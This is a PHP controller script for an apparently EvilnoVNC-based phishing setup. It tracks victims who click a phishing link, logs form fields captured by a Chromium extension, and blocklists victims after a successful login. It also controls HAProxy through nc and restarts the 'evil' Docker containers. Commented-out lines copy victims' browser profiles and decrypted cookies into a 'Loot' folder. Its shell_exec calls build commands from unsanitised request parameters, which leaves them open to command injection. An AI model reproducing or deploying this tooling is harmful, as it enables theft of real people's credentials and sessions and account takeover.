<?php
// CONTROLLER
error_reporting(E_ALL);

date_default_timezone_set("Europe/Berlin");
$timestamp = time();
$accesslog = "/etc/accesslog.txt";
$submitlog = "/etc/submitlog.txt";
$statefile = "/etc/targets.json";
$contentjs = "/etc/content.js";

if(!isset($_GET["svr"]) || !isset($_GET["cmd"])) {
	echo "Error: missing arguments";
	error_log("missing arguments");
	exit(1);
}

function GET($var)  { return isset($_GET[$var])  ? htmlspecialchars($_GET[$var])  : null; }
function POST($var) { return isset($_POST[$var]) ? htmlspecialchars($_POST[$var]) : null; }

$svrno = GET("svr");
$command = GET("cmd");
$reqid = GET("reqid");

function base64url_encode($data) {
	return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64url_decode($data) {
	return base64_decode(str_pad(strtr($data, '-_', '+/'), strlen($data) % 4, '=', STR_PAD_RIGHT));
}

function add_logentry($logfile, $entry) {
	$file = fopen($logfile, 'a');

	if(flock($file, LOCK_EX)) {
		fwrite($file, $entry);
		fflush($file);
		flock($file, LOCK_UN);
	} else {
		echo("Error: could not get a lock ($logfile)");
	}
	fclose($file);
}

function get_state() {
	global $statefile;
	// get state as php nested array
	return json_decode(file_get_contents($statefile), true);
}

function update_state($array) {
	global $statefile;

	$file = fopen($statefile, 'w');
	$json = json_encode($array);

	if(flock($file, LOCK_EX)) {
		fwrite($file, $json);
		fflush($file);
		flock($file, LOCK_UN);
	} else {
		echo("Error: could not get a lock (state file)");
	}
	fclose($file);
}

function lookupUserId($reqid) {
	global $statefile;

	if($reqid === "admin") return "admin";

	if(($json = file_get_contents($statefile)) === false) {
		echo "[!] Could not read state file.";
		return;
	}

	$state = json_decode($json, true);
	
	if(is_array($state)) {
		foreach($state as $s) {
			if($s["reqid"] === $reqid) return $s["userid"];
		}
	}
}

function logaccess() {
	global $accesslog, $svrno, $reqid, $timestamp;
	//$ip = array_key_exists($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $_SERVER['REMOTE_ADDR'];

	// resolve user id by lookup table reqid<>email
	$userid = lookupUserId($reqid);

	$ip = GET("ip");
	/*if(isset($_GET["ip"]))
		$ip = htmlspecialchars($_GET["ip"]);*/

	if(isset($_GET["agent"]))
		$agent = htmlspecialchars(base64url_decode($_GET["agent"]));

	// add entry to log file
	$entry = "$timestamp\ts$svrno\t$reqid\t$userid\t$ip\t$agent\n";
	// <timestamp> s<sid> <reqid> <userid> <ip> <agent>

	add_logentry($accesslog, $entry);

	// set server instance in maintenance mode
	//shell_exec("echo 'set server novnc/s$svrno state drain' | nc hap 8000");

	// update state in statefile
	$state = get_state();

	foreach($state as &$s) {
		if($s["reqid"] === $reqid && $s["state"] < 1) {
			// set state to clicked 
			$s["state"] = 1;
			// set access time
			$s["time1"] = $timestamp;
		}
	}
	update_state($state);
}

// get form data from submit via Chromium extension
function logsubmit() {
	global $submitlog, $svrno, $reqid, $timestamp;

	if(!isset($reqid)) {
		echo "Error: missing argument id (submit log)";
		error_log("missing argument id (submit log)");
		exit(1);
	}

	// lookup user id via request id
	$userid = lookupUserId($reqid);

	if(!isset($_GET["fields"])) {
		echo "Error: missing argument fields (submit log)";
		error_log("missing argument fields (submit log)");
		exit(1);
	}

	$fields = htmlspecialchars(base64url_decode($_GET["fields"]));

	$entry = "$timestamp\ts$svrno\t$reqid\t$userid\t$fields\n";

	add_logentry($submitlog, $entry);

	// update state in statefile
	$state = get_state();
	foreach($state as &$s) {
		if($s["reqid"] === $reqid && $s["state"] < 3) { // state < 3 should not happen (blacklist!)
			// set state to submitted
			$s["state"] = 2;
			// set access time
			$s["time2"] = $timestamp;
			// add fields to state file
			$s["inputs"] = $fields;
		}
	}
	update_state($state);
}

// successfully logged in -> close connection, block user and write state
function closeblock() {
	global $svrno, $reqid, $timestamp;

	$state = get_state();

	// check if state already set and blocked, assuming admin access
	foreach($state as $s) {
		if($s["userid"] === $reqid && $s["state"] === 3) {
			echo "[*] id exists, user already blocked, skipping closeblock (assuming admin access)";
			return;
		}
	}

	// add request id to blacklist acl via runtime API
	echo "[*] adding user id to acl";
	shell_exec("echo 'add acl /etc/blacklist.acl $reqid' | nc hap 8000");
	// add to blacklist on file system for persistence
	shell_exec("docker exec controller echo '$reqid' >> /etc/blacklist.acl");

	// send signal to close all connections and shut server
	echo "[*] setting server novnc/s$svrno in maintenance state";
	echo "[*] killing all connections to server novnc/s$svrno";
	shell_exec("echo 'set server novnc/s$svrno state maint; shutdown sessions server novnc/s$svrno' | nc hap 8000");
	
	// IF NO INTERACTIVE SESSION IS INTENDED
	//resetserver();

	// update state in statefile
	echo "[*] writing state file";
	foreach($state as &$s) {
		if($s["reqid"] === $reqid) { // && $s["state"] < 3
			// set state to authorized
			$s["state"] = 3;
			// set access time
			$s["time3"] = $timestamp;
		}
	}

	update_state($state);
	
	echo "[*] done";
}


function resetserver() {
	global $statefile, $reqid, $svrno, $contentjs;

	// remove formerly found resolution and reqid
	echo "[*] deleting former resolution+reqid... " . PHP_EOL;
	echo shell_exec("docker exec evil$svrno rm -f /home/user/tmp/resolution$svrno.txt");
	echo shell_exec("docker exec evil$svrno rm -f /home/user/tmp/reqid$svrno.txt");

	// reset chrome extension variables (reqid+sid), better be safe...
	echo "[*] resetting chrome extension variables... " . PHP_EOL;
	//shell_exec("sed -i 's/const id = \".*\"/const id = \"REQID\"/' $contentjs");
	//shell_exec("sed -i 's/const serverName = \".*\"/const serverName = \"SNAME\"/' $contentjs");
	echo shell_exec("docker cp $contentjs evil$svrno:/home/user/extension/"); // sed uses same dir for temp file... -> copy

	// save collected data to central directory
	//$dir = "/etc/Loot/$reqid/";
	//echo shell_exec("docker exec evil$svrno sudo bash -c 'mkdir -p $dir && chmod 777 $dir'");
	//echo shell_exec("docker cp evil$svrno:/home/user/.config/chromium/Default $dir");
	//echo shell_exec("docker exec evil$svrno cp -r /home/user/.config/chromium/Default $dir");
	// decrypt cookie explicitely
	//echo shell_exec("docker exec evil$svrno python3 cookies.py > Downloads/cookies.txt");
	// copy Downloads dir
	//echo shell_exec("docker exec evil$svrno cp -r /home/user/Downloads $dir");

	// deleting collected chromium data
	//echo shell_exec("docker exec evil$svrno sudo rm -rf /home/user/.config/chromium /home/user/Downloads");
	
	// clear errorlog.txt
	echo shell_exec("docker exec evil$svrno true > /home/user/errorlog.txt");

	// reset EvilnoVNC instance: restart docker container
	echo "[*] restarting container... ";
	echo shell_exec("docker restart -t 0 evil$svrno");

	// set backend server to state ready (up)
	echo "[*] setting server state to ready...";
	echo shell_exec("echo 'set server novnc/s$svrno state ready' | nc hap 8000");

	echo "[*] done";
}

function blockuser() {
	global $reqid;

	// put user on blacklist
	echo shell_exec("echo 'add acl /etc/blacklist.acl $reqid' | nc hap 8000");

	// update targets.json
	$state = get_state();

	foreach($state as &$s) {
		if($s["reqid"] === $reqid && $s["blocked"] == 0) {
			// set blocked
			$s["blocked"] = 1;

			update_state($state);
			break;
		}
	}

	resetserver();	
}


switch($command) {
	// user clicked the phishing link
	// used by preload page to get resolution TODO
	case "logaccess":
		logaccess();
		break;
	// user submitted some data
	// used by chrome extension
	case "logsubmit":
		logsubmit();
		break;
	// user successfully logged in
	// used by chrome extension
	case "success":
		closeblock();
		break;
	// restart server
	// used by admins via dashboard
	case "reset":
		resetserver();
		break;
	// block user/victim
	// used by admins via dashboard
	case "block":
		blockuser();
		break;
}

?>
